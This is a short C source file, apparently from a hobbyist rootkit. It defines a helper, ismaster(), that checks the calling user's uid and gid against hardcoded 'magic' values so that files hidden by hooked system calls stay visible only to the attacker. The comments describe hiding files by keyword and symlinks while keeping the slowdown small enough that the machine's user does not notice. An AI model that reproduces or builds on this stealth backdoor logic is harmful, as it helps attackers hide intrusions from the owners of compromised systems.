/*
*
*@@@ landyy @@@
*
*This file is for any functions that may be used by multiple system calls
*
*/

#include "h00kDir.h"

//checks to see if the user accessing the system call is allowed to see our
//secret files :)
int ismaster(){
    //okay so here in the plan for this. We are going to create a directory in
    //which we create a symbolic link to files we want to hide that are not
    //hid by are keyword. the directory will be read for if a file is linked
    //in that directory. Those files will all start with our keyword so that
    //they will be hid as well. Problems that could occur with this solution
    //1.) time complexitiy - we don't want the user to notice what is going 
    //on because shit slow down
    //2.)this may just completely backfire.
    //this is all subject to change
    #ifdef DEBUG
	printf("ismaster called\n");
    #endif
    
    int myuid = 0; 
    int mygid = 0;
    myuid = getuid();
    mygid = getgid();

    if(myuid == magicuid && mygid == magicgid){
	#ifdef DEBUG
	    printf("ismaster check passed\n");
	#endif
	
	return 0;
    }

    return 1;

}


